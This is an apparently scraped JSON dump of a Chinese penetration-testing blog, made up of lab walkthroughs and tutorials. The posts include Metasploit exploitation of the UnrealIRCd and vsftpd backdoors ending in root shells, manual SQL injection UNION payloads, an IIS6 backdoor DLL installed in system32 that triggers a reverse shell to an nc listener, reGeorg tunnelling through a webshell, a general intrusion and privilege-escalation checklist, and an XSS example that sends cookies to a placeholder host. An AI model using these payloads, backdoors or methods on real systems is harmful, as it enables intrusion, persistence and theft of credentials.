——未完待续——","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"思路总结","slug":"思路总结","permalink":"/tags/%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"}]},{"title":"铁三训练营之Metasploit溢出UnrealIRCd后门漏洞","slug":"铁三训练营之Metasploit溢出UnrealIRCd后门漏洞","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:33:49.061Z","comments":true,"path":"2018/05/09/铁三训练营之Metasploit溢出UnrealIRCd后门漏洞/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/","excerpt":"Metasploit溢出UnrealIRCd后门漏洞","text":"Metasploit溢出UnrealIRCd后门漏洞 网络拓扑图 一、利用nmap工具扫描目标主机1.1使用nmap命令对目标主机进行扫描。单击桌面空白处,右键菜单选择“在终端中打开”。如图1所示 1.2在终端中输入命令”nmap -sV 192.168.1.3”,对目标主机进行端口扫描,发现开放6667端口,对应的服务为unreal ircd。如图2所示 1.3在终端中输入命令”msfconsole”,启动MSF终端。如图3所示 1.4在终端中输入命令”search unreal ircd”,搜索ircd的相关工具和攻击载荷。如图4所示 1.5在终端中输入命令”use exploit/unx/irc/unreal_ircd3281_backdoor”,启用漏洞利用模块,提示符就会提示进入到该路径下。如图5所示 1.6在终端中输入命令”show options”,查香需要设置的相关项,”yes”表示必须填写的参数。如图6所示 1.7在终端中输入命令”set RHOST 192.168.1.3”,设置目标主机的IP地址。如图7所示 1.8在终端中输入”exploit”,开始向目标主机攻击,攻击成功后,建立shell会话。如图8所示 1.9在终端中输入”whoami”,查看获得的权限为root,输入命令”cat /etc/passwd”,直看系统的帐号和密码。如图9所示","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"铁三训练营之SQL注入漏洞","slug":"铁三训练营之SQL注入漏洞","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:33:43.454Z","comments":true,"path":"2018/05/09/铁三训练营之SQL注入漏洞/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","excerpt":"CVE-2015-2183 Zeuscart SQL注入漏洞","text":"CVE-2015-2183 Zeuscart SQL注入漏洞 清明没回家扫墓，也没人带我去玩，也就在这里做一下漏洞复现。 漏洞复现访问【http://192.168.1.3/ admin/】。如图1所示 使用账户【 admin】和密码【 admin888】进行登录，如图2所示 访问 【http://192.168.1.3/ admin/do= editcurrency&amp;cid=1】。如图3所示 访问【http://192.168.1.3/ admin/do= editcurrency&amp;cid=1】,发现页面和前面页面不一样,说明当前页面存在注入。如图4所示 访问【http://192.168.1.3/ admin/?do= editcurrency&amp;cid=1+ order+by+5+–+】,发现页面正常。如图5所示 访问【http://192.168.1.3/ admin/?do= editcurrency&amp;cid=1+ order.+by+6+–+】,发现页面和前面页面不一样,说明当前查询了5个字段。如图6所示 访问【http://192.168.1.3/ admin/?do=editcurrency&amp;cid=1+union+select+1, 2, 3, 4,5+–+】,发现1和3回显了。如图7所示 访问【http://192.168.1.3/ admin/?do=editcurrency&amp;cid=l+union+select+1, user(),3,version(),5+–+】,直询当前的用户和版本。如图8所示 访问【http://192.168.1.3/ admin/?do=editcurrency&amp;cid=1+union+select+1, group_concat(schema name),3, 4, 5+from+information schemaschemata+–+】,查询当前的所有数据库。如图9所示 在目标机中打开【 C: \\phpstudy\\admin\\classes\\ Core \\Settings】下的【 Ccurrencysettings. php】中的第182行,调用了editcurrency会找到 showeditcurrency函数,然后判断是否接收cid参数,如果接收实例化Bin_Query类然后调用里面的 executequery函数执行sq语句。如图10所示 打开【C:\\phpstudy\\www\\bin】下的【 Query. php】中的第49行,可以看到执行Sql语句并没有过滤。如图11所示 加深理解SQL注入攻击是黑客对数据库进行攻击的常用手段之一。随着B/S模式应用开发的发展，使用这种模式编写应用程序的程序员也越来越多。但是由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据，这就是所谓的SQL Injection，即SQL注入。 ————引用百度百科 自己对他的一点理解sql注入是我接触信息安全最早的一个漏洞，我相信很多很多人开始学习渗透的时候，应该都是从注入开始的，说说我最早的是怎么理解这个漏洞的吧，我是一个软件工程的学生，我们从大一下册做作品的时候就开始接触到数据库操作语句，增删改查是我们用的最多了，然而这里面用的最多的也就是查，SQL注入漏洞正是网站对传入的参数未进行判断就带入系统查询，所以使得渗透人员可以从此判断出数据库是否存在这一条内容，SQL注入我一开始就是用工具上手的，sqlmap，穿山甲，啊D，明小子，我都用过，其实现在的网站只要不是太旧，大多都会上安全狗，即使你源码存在对参数的未过滤，安全狗也会对你访问网站时的操作进行判断，他会有一套规则来防止你进行SQL注入，当然，上有政策，下有对策，有防护就有绕过，你能摸透他防护的规则也可以用方法绕过，这就涉及到手工注入了，除了在网站网址哪里进行SQL注入，也有别的地方可以进行注入，一般网站源码中一般都会存在条件查询的语句，带有条件查询的地方，就有可能存在注入，例如站内的搜索……在我看来，注入更多的是需要实战和经验。","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"铁三训练营之Metasploit溢出vsftp特权提升漏洞","slug":"铁三训练营之Metasploit溢出vsftp特权提升漏洞","date":"2018-05-08T16:00:00.000Z","updated":"2019-03-08T07:33:46.237Z","comments":true,"path":"2018/05/09/铁三训练营之Metasploit溢出vsftp特权提升漏洞/","link":"","permalink":"/2018/05/09/%E9%93%81%E4%B8%89%E8%AE%AD%E7%BB%83%E8%90%A5%E4%B9%8BMetasploit%E6%BA%A2%E5%87%BAvsftp%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E/","excerpt":"Metasploit溢出vsftp特权提升漏洞","text":"Metasploit溢出vsftp特权提升漏洞 网络拓扑图 一、利用nmap工具扫描目标主机1.1使用nmap命令对目标主机进行扫描。单击桌面,右键菜单选择“在终端中打开”。如图1所示 1.2在终端中输入命令”nmap -sV 192.168.1.3”,对目标主机进行端囗扫描,发现开放21端口并且安装时vsftpd服务器软件,版本为2.3.4。如图2所示 1.3在终端中输入命令”msfconsole”,启动MSF终端如图3所示 1.4在终端中输入命令”search vsftpd”,搜索vsftpd的相关工具和攻击载荷,显示vsftpd v2.3.4版本的漏洞利用模块。如图4所示 1.5在终端中输入命令”use exploit/unix/ftp/vsftpd_234_backdoor”,启用漏洞利用模块,提示符就会提示进入到该路径下。如图5所示 1.6在终端中输入命令”show options”,查看需要设置的相关项,”yes”表示必须填写的参数。如图6所示 1.7在终端中输入命令”set RHOST 192.168.1.3”,设置目标主机的IP地址。如图7所示 1.8在终端中输入”show payloads”,显示Metasploit中可以在远程主机执行的代码,即shellcode。如图8所示 1.9在终端中输入” set PAYLOAD cmd/unix/interact”选择在远程主机执行的 shellcode代码。如图9所示 1.10在终端中输入”exploit”,实施攻击(执行一次若没有出现结果,多执行几次)。攻击成功后,输入命令”ifconfig”,查看IP为目标主机,表示溢出成功。如图10所示 1.11在终端中输入”whoami”,查看获得的权限为root,输入命令”cat /etc/passwd”,直看系统的帐号和密码。如图11所示","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"nessus的安装使用","slug":"nessus的安装使用","date":"2018-04-29T04:00:00.000Z","updated":"2019-03-08T07:30:46.033Z","comments":true,"path":"2018/04/29/nessus的安装使用/","link":"","permalink":"/2018/04/29/nessus%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/","excerpt":"写篇博客一边等事做。","text":"写篇博客一边等事做。 nessus的安装下载nessus下载地址：链接：https://www.tenable.com/downloads/nessus 操作系统 Windows10 1、根据系统选择安装包：https://www.tenable.com/products/nessus/select-your-operating-system 2、申请激活码，在我们安装的时候差不多激活码就发到邮箱里面了：https://www.tenable.com/products/nessus-home 3.安装软件包，按提示进行即可 4、安装完成后在地址栏访问https://localhost:8834/，会提示证书错误，添加信任继续访问就好，添加用户和口令 5、输入激活码（此时激活码已经发到邮箱里面了），开始初始化，需要的时间有点长，就OK了 nessus的使用1、访问网址 https://127.0.0.1:8834 ，进行登录 2、登陆之后经过漫长的配置之后，可以进入网址新建规则（policy） 3、选择规则的类型，此处选择自定义 4、设置规则名字 5、先将所有的插件禁用，选择性地开启需要扫描的插件 6、将需要扫描用到的插件开启，直接点击前面的按钮即可 7、创建扫描任务 8、选择系统默认的规则或者自己手创建过的规则 9、填写扫描任务名称和靶机地址 10、启动扫描任务 11、等待扫描，直到扫描结束 12、可以查看扫描到的主机及其详细信息 13、可以查看扫描到的漏洞及其详细信息","categories":[{"name":"渗透","slug":"渗透","permalink":"/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"网站渗透思路全方面总结 (详细篇)","slug":"网站渗透思路全方面总结 (详细篇)","date":"2018-04-27T16:00:00.000Z","updated":"2019-03-08T07:33:20.381Z","comments":true,"path":"2018/04/28/网站渗透思路全方面总结 (详细篇)/","link":"","permalink":"/2018/04/28/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E5%85%A8%E6%96%B9%E9%9D%A2%E6%80%BB%E7%BB%93%20(%E8%AF%A6%E7%BB%86%E7%AF%87)/","excerpt":"原文转载来自：https://www.exehack.net/131.html","text":"原文转载来自：https://www.exehack.net/131.html 针对新手写一点渗透的小思路、小技巧，主要讲的是思路，所有不会太详细。经常逛一些好的博客或者门户站，坚持下来，每天学一点思路，你会积累到很多东西，记住：技术需要时间沉淀。 （一）针对网站程序，不考虑服务器。一、查找注入，注意数据库用户权限和站库是否同服。二、查找XSS，最近盲打很流行，不管怎样我们的目的是进入后台。三、查找上传，一些能上传的页面，比如申请友链、会员头像、和一些敏感页面等等，注意查看验证方式是否能绕过，注意结合服务器的解析特性，比如典型的IIS6.0、阿帕奇等。四、查找编辑器，比较典型的ewebeditor、fckeditor等等。五、查找phpmyadmin等管理程序，可以尝试弱口令，或者寻找其漏洞。六、百度、谷歌搜索程序公开漏洞。七、猜解文件，如知道某文件为admin_login.php,我们可尝试admin_add.php、admin_upload.php文件是否存在，也可以谷歌搜索site:exehack.net inurl:edit等等，很多时候可以找到一些敏感文件，接着看是否验证权限或能否绕过验证。八、会员注册、修改、删除、评论等一切需要操作数据库的地方记得加单引号之类查看是否存在insert、update等类型注入。九、会员或低权限管理登陆后可抓包分析，尝试修改超级管理员密码，权限提升。十、通常有下载功能的站我们可以尝试修改下URL文件名，看能否下载站点敏感文件，如数据库配置文件等，数据库不可外连情况下可以尝试数据库密码登陆后台，也可下载上传、登陆验证等文件进行代码审计。十一、备份文件和后门，某些主站子目录存在分站，比如www.exehack.net/software，我们可以尝试www.exehack.net/software.zip/zip等压缩文件是否存在，可能就是子站的源码。也有一些站类似这样www.exehack.net/old/，一般都是以前的老站，通常老站会比较容易拿。还有就是数据库备份、前人的后门等，具体这些目录上的东西就要看你的字典了。十二、0day漏洞，不管是别人给你的，还是自己挖的，总之好使就行。十三、。。。 （二）针对服务器一、通常先扫下服务器开放的端口，再考虑对策。二、比较常见的解析漏洞，比如IIS6.0、阿帕奇、nginx/IIS7.0(php-fpm)解析漏洞等，还有就是cer、asa之类的解析，.htaccess文件解析配置等。三、弱口令和everyone权限，先扫描服务器开放的端口，比如21对应的FTP、1433对应的MSSQL、3306对应的MYSQL、3389对应的远程桌面、1521对应的Oracle等等，平时可以多搜集下字典，有时候效果也是不错的(通常在cain嗅探的时候，经常能嗅到别人不停的扫…很蛋疼)。四、溢出，这点要看系统补丁和服务器使用的软件等等，比如FTP等工具，这里不详解。五、针对一些服务器管理程序，比如tomcat、jboss等等，这种比较常见于大中型的站点服务器。六、IIS、apache等各种漏洞，这个要平时多关注。七、目录浏览，服务器配置不当，可直接浏览目录。八、共享…九、。。。 （三）针对人，社工社工在渗透中通常能起到惊人的效果，主要还是利用人的弱点，博大精深，这里不详细讨论，注意平时多看一些社工文章，学习一些思路、技巧。 （四）迂回战术，旁注和C段一、旁注，针对旁站，我们可以运用到上面说到的方法，这里不多说。二、C段，基本想到C段就会想到cain，针对C段的站点和服务器，结合上面说的针对目标站、服务器、人、旁站的思路，一个道理，当然如果你的目的仅仅是黑站的话，不妨试试NetFuke之类。三、… （五）提权常用手段一、使用系统溢出提权EXP，这类在提权中最常用，使用的方法大都一致，比如比较常见的巴西烤肉、pr等等，溢出提权通常在Linux上也利用的比较多，注意多收集EXP。二、第三方软件提权，主要还是利用服务器上安装的第三方软件拥有比较高的权限，或者软件的溢出漏洞，比如典型的mssql、mysql、serv-u等等，还有各种远程控制软件，比如pcanywhere、Radmin这类。三、劫持提权，说到这个，想必肯定会想到lpk.dll这类工具，有时候在蛋疼怎么都加不上账户的时候，可以试试劫持shift、添加开机启动等等思路。四、弱口令技巧，我们可以看看有木有什么hack、或者隐藏账户之类的，一般这种用户密码都比较简单，可以尝试下弱口令，还有之前说过的各种数据库、远程控制软件、FTP软件的弱口令，没办法的时候就去扫扫碰碰运气吧。五、信息收集，注意翻下硬盘各种文档，说不定各种密码就在里面。在内网渗透时，信息收集是非常重要的，记得拿下服务器了GET一下明文密码，德国那个mimikatz不错，还有就是域、ARP。。。貌似扯多跑题了。六、社工…不多说。暂时总结到这里，渗透博大精深，不是这么几段字就能说清楚的，具体还是要看具体情形，随机应变。一定要养成在渗透过程中信息收集的好习惯，特别是针对大中型站点，注意收集子站域名、目录、密码等等敏感信息，这对于我们后面的渗透非常有用，内网经常弱口令，同密码比较多。很多时候，或许一个主站就死在子站的一个小漏洞上。","categories":[{"name":"技术积累","slug":"技术积累","permalink":"/categories/%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"思路总结","slug":"思路总结","permalink":"/tags/%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"}]},{"title":"iis6.x后门","slug":"iis6.x后门","date":"2018-04-25T04:00:00.000Z","updated":"2019-03-08T07:31:26.293Z","comments":true,"path":"2018/04/25/iis6.x后门/","link":"","permalink":"/2018/04/25/iis6.x%E5%90%8E%E9%97%A8/","excerpt":"好记性不如烂笔头","text":"好记性不如烂笔头 一直以来学习渗透，看过很多文章，方法，招式，但是有的时候，久而久之就忘了，所以打算每次看到好的招式就复现一下，加深理解，以后翻起来也容易。 今天复现的是师兄教我的，一个iis6.x的后门。也许以后我的博客会有师弟们看吧，我尽量把步骤过程写的详细些。 环境搭建虚拟机的搭建不讲了，基础的。我也早就搭建好了。环境机器是Windows2003 iis6.0安装 控制面板”，依次选“添加/删除程序”， 添加/删除Windows组件 在应用程序服务器前打钩、点击详细信息 将“Internet信息服务（IIS）”前的小钩去掉（如有），重新勾选中后，点击下面的详细信息 然后添加IIS组件中的Web、FTP、NNTP和SMTP等全部四项服务。 点击确定、然后点击下一步、就会进行安装 安装完成后 点击完成、当IIS添加成功之后，再进入“开始→设置→控制面板→管理工具→Internet服务管理器(IIS管理器)”打开IIS管理器 可以看到IIS有个默认站点: 查看默认站点的目录路径: 配置WEB站点从网上随便下一个ASP的网站源码 下载好之后解压 在Internet服务管理器(IIS管理器)中新建一个网站 点击下一步 点击下一步、IP为192.168.87.129 ，这是主机的IP！使用80端口！ 点击下一步、并将目录路径指向C:/fendo文件夹下！ 点击下一步 点击下一步 创建成功!!!! 把上面解压的ASP文件全部复制到C:/fendo文件夹 然后设置一些IIS选项、在新建的fendo单击右键，属性，弹出如下的界面 选择主目录、点击配置 选择调试、勾上那两个勾 然后点击选项、勾上启用父路径 然后点击确定、再选择文档、点击添加、新增一个index.php文件 点击确定、然后单击”web服务扩展”、按图所示设置允许。 然后通过浏览器访问网站: http://fendo/myadmin/index.asp 显示成功!!! 成功！！！ 放入后门我将后门放入Windows下的system32目录，因为那里的dll文件比较多，管理员不容易发现。打开internet信息服务（IIS）管理器找到默认网站右键点击属性，点击ISAPI筛选器添加iis_x86.dlldll文件。文章结束附上下载链接。 攻击攻击环境Windows7+nc.exe攻击机用nc监听端口，执行命令nc.exe -lvvp 80修改User agent内容，这里以谷歌浏览器为例，点击More tools然后选中Network conditions 一刷新就回弹shell了，但是我的nc.exe好像出问题一弹shell就闪退。我就放上师兄的效果图好了。 链接大牛博客：micropoor.blogspot.com32位dll下载：https://drive.google.com/file/d/1-dKhidlBXg3YZ144fejY8FPaYl2KX3Ot/view64位dll下载：https://drive.google.com/file/d/1M5hh2IQsnb_sJwIAkOHIJecarcp2FDhL/view下之前挂个代理，不然访问不到。 分析一波这个后门就是修改文件头访问网站的时候触发这个后门反弹shell，总的来说是个好的招式，只是觉得不够隐蔽，因为在iis哪里调用这个dll，管理员翻一下就发现了。但是总的来说还是挺好用的吧。","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]},{"title":"reGeorg+Proxifier","slug":"reGeorg+Proxifier","date":"2018-04-20T16:00:00.000Z","updated":"2019-03-08T07:37:32.661Z","comments":true,"path":"2018/04/21/reGeorg+Proxifier/","link":"","permalink":"/2018/04/21/reGeorg+Proxifier/","excerpt":"填Linux搭建ss的坑。总算找到方法了","text":"填Linux搭建ss的坑。总算找到方法了 这几天小伙伴们玩漏洞玩得很happy，实战过程中也琢磨了很多新姿势，跟着学了一点。 正向代理和反向代理简单区分一下正向代理和反向代理1、正向代理，是一个位于客户端和原始服务器之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理；2、反向代理，是指以代理服务器来接受Internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给Internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。 攻击拿下webshell的方法就跳过，大家的方法不同，重点讲的是怎么搭建SOCKS5进行一个内网渗透。网上的教程让我看的半懂不懂的，折磨人，可能是我傻吧。当你拿下webshell的时候其实就只用做一件事就可以了。下载和配置reGeorg由于reGeorg是用python脚本编写，需要urllib3模块，下面先进行安装https://github.com/sensepost/reGeorg reGeorg下载地址你把对应的网页文件放进网站根目录下，反正可以访问就可以了。这就ojbk了 本地环境使用reGeorg需要安装setuptools和ez_setup.pyhttps://pypi.python.org/pypi/setuptools#windows-simplified （如果是Windows环境安装次版本即可，安装完成也同时安装了pip）https://bootstrap.pypa.io/ez_setup.py（Linux环境使用） Python 2.4.9和3.3以后的版本基本上 ez_setup 和 pip 已经默认安装。如下图 如果你是旧版本，就自己看教程吧。https://blog.csdn.net/ytusdc/article/details/78357703 下载setuptools解压后如下： 将setuptools 复制到 C:\\Python27\\（复制到python安装根目录）在命令提示符下切换到C:\\Python27\\，依次运行如下命令。python setup.py buildpython setup.py installsetuptools包含了pip，可直接用pip安装urllib3模块。命令提示符下切换到C:\\Python27\\Scripts，直接运行pip install urllib3reGeorg工具安装完成。 reGeorg使用方法运行命令提示符下切换到C:\\Python27\\，运行 python reGeorgSocksProxy.py -u (上传reGeorg脚本的地址) -p (转发端口)，参数顺序无强制要求。 Proxifier使用打开Proxifier，点击配置文件，点击代理服务器，添加然后就成功了。 监听代理时候注意规则将python.exe添加列外，不然会死循环。","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}],"tags":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"/tags/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"}]},{"title":"XSS攻击的三种基本形式解析","slug":"XSS攻击的三种基本形式解析","date":"2018-04-19T16:00:00.000Z","updated":"2019-03-08T07:36:03.629Z","comments":true,"path":"2018/04/20/XSS攻击的三种基本形式解析/","link":"","permalink":"/2018/04/20/XSS%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%89%E7%A7%8D%E5%9F%BA%E6%9C%AC%E5%BD%A2%E5%BC%8F%E8%A7%A3%E6%9E%90/","excerpt":"原文转载来自：http://www.cnblogs.com/lovesong/p/5199623.html","text":"原文转载来自：http://www.cnblogs.com/lovesong/p/5199623.html XSS（cross-site scripting跨域脚本攻击）攻击是最常见的Web攻击，其重点是“跨域”和“客户端执行”。有人将XSS攻击分为三种，分别是： Reflected XSS（基于反射的XSS攻击） Stored XSS（基于存储的XSS攻击） DOM-based or local XSS（基于DOM或本地的XSS攻击） Reflected XSS基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。 例子： 做个假设，当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。 在搜索框搜索内容，填入“alert('handsome boy')”, 点击搜索。 当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。 进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址： 1http://www.amazon.cn/search?name=&lt;script&gt;document.location='http://xxx/get?cookie='+document.cookie&lt;/script&gt; PS：这个地址当然是没效的，只是举例子而已。 结论： 如果只是1、2、3步做成功，那也只是自己折腾自己而已，如果第4步能做成功，才是个像样的XSS攻击。 开发安全措施： 前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。 后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。 例如： 标签： 1&lt;span&gt;&lt;script&gt;alert('handsome boy')&lt;/script&gt;&lt;/span&gt; 转义 1&lt;span&gt;&amp;lt;script&amp;gt;alert(&amp;#39;handsome boy&amp;#39;)&amp;lt;/script&amp;gt&lt;/span&gt; 属性： 如果一个input的value属性值是 1琅琊榜\" onclick=\"javascript:alert('handsome boy') 就可能出现 1&lt;input type=\"text\" value=\"琅琊榜\" onclick=\"javascript:alert('handsome boy')\"&gt; Stored XSS基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。 例子： 发一篇文章，里面包含了恶意脚本 1今天天气不错啊！&lt;script&gt;alert('handsome boy')&lt;/script&gt; 后端没有对文章进行过滤，直接保存文章内容到数据库。 当其他看这篇文章的时候，包含的恶意脚本就会执行。 PS：因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。 结论： 后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。 开发安全措施： 首要是服务端要进行过滤，因为前端的校验可以被绕过。 当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。 DOM-based or local XSS基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。 例子1： 提供一个免费的wifi。 开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。 之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。 收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。 当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。 PS：例子和图片来自，http://www.cnblogs.com/index-html/p/wifi_hijack_3.html 这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。 例子2： 还是提供一个免费wifi 在我们电脑上进行抓包 分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）等。 PS：这个是我的测试，在51job页面登录时进行抓包，可以获取帐号密码。 结论：这攻击其实跟网站本身没有什么关系，只是数据被中间人获取了而已，而由于HTTP是明文传输的，所以是极可能被窃取的。 开发安全措施： 使用HTTPS！就跟我前面《HTTP与HTTPS握手的那些事》这篇文章说的，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。 总结 XSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站上原有的脚本（某篇文章说的）。本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性，。","categories":[{"name":"技术积累","slug":"技术积累","permalink":"/categories/%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"CTF线下赛环境模拟","slug":"CTF线下赛环境模拟","date":"2018-04-03T16:00:00.000Z","updated":"2019-03-08T07:32:14.509Z","comments":true,"path":"2018/04/04/CTF线下赛环境模拟/","link":"","permalink":"/2018/04/04/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%8E%AF%E5%A2%83%E6%A8%A1%E6%8B%9F/","excerpt":"为了准备之后的线下赛，搭建环境练手前期维护。","text":"为了准备之后的线下赛，搭建环境练手前期维护。 这段时间准备要参加新的比赛了，对于萌新的我，当然想着不要被虐的太惨，于是乎找了师兄们找了他们要了他们之前参加线下赛的源码。好比考前复习一样，所以写了这篇线下赛环境模拟的文章给以后的师弟们看。 环境搭建我准备的环境是Linux的Ubuntu16.04版本，是因为想要搭建成一个系统和web端都存在漏洞的环境，搭建一个wordpress的web，和一个phpcms v9的web，一个ssh低权限账户，ubuntu16.04可用脏牛提权（因为只会脏牛提权（捂脸ing））。Ubuntu的搭建点击“Install Ubuntu” 勾选“Download updates while installing Ubuntu”，点击“Continue”; 选择“Erase disk and install Ubuntu”，点击“Install Now”; 在弹出的窗口中选择“Continue”；PS: 因为我们是新安装的系统，且在虚拟机中，所以可以选择“Erase disk and install Ubuntu” 点击地图上的中国的位置，会默认弹出上海的时区，因为中国所有地区都是使用同一个时区，所以上海的就OK了。点击“Continue”； 选择键盘布局，点击“Continue”； 设置电脑名称和账号密码，点击即可开始安装系统。 安装完成后会有如下提示，根据提示重启电脑即可。 重启后： 至此，安装完成，开启你的Ubuntu之旅吧！ php环境配置apache2+php+mysqlPS：这个过程中有重要的一点，下面的安装最后是在root权限下执行，不然就会出现一些问题，很难受。Ubuntu切换到root权限命令如下sudo su php环境搭建，在终端中输入以下代码,install后面为安装的软件： 123456789sudo apt-get install apache2sudo add-apt-repository -y ppa:ondrej/phpsudo apt updatesudo apt install php7.0sudo apt install -y mysql-server mysql-clientsudo apt-get install libapache2-mod-php7.0sudo apt-get install php7.0-mysqlsudo apt-get install php7.0-gdsudo apt-get install phpmyadmin 在安装过程中会要求选择Web server：apache2或lighttpd，使用空格键选定apache2，然后确定,下面界面输入你刚才安装Mysql时设置的密码，确定。再确认一次Mysql密码，确定。 然后将phpmyadmin与apache2建立连接，sudo ln -s /usr/share/phpmyadmin /var/www/html wordpress的搭建我这时候是有师兄给的源码的，本来打算是把wordpress放到/var/www目录下直接就可以访问的，但是这时候www目录有一个锁头，这个文件被锁了。这也是我过程遇到的问题之一。顺便把我解决的方法说一下。首先当然是在终端切换到root权限。 然后修改/var/www的目录权限命令如下 1chmod 777 /var/www 权限修改好以后就可以对文件夹内的东西进行任意操作了。我把源码放入/var/www中，然后访问http://localhost/wp/index.php出现如下： 数据库没连接，当时我百度了一下。百度给出了这个方法。 意思就是创建一个wordpress的数据库，在创建一个数据库账号。在wordpress的配置文件修改，就可以了。我就说说我后来的操作吧。打开终端： 12345678sudo su #切换到root权限mysql -u root -p #登录数据库 CREATE DATABASE wordpress; #创建WordPress的数据库CREATE USER wordpressadmin@localhost IDENTIFIED BY 'wordpresspassword'; #创建数据库管理员 GRANT ALL PRIVILEGES ON wordpress.* TO wordpressadmin@localhost; #将管理权限赋给管理员FLUSH PRIVILEGES;exit #刷新权限信息来激活用户权限 sudo service mysql restart #重启MySQL 数据库就建立好了。再修改wordpress的配置信息。 访问http://localhost/wp/wp-admin/install.php，写入内容就可以访问了。 phpcms v9的搭建同理将源码放入/var/www的目录下。1·打开网http://你的域名/install/index.php 2·点击“开始安装”进入下一步环境检测，功能影响，只要是都是绿色的打勾就可以进行下一步安装了。 3·全新安装包括phpsso(PHPSSO是用PHP开发的单点登录系统。在接入PHPSSO的多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统)。其他模块根据需要安装。 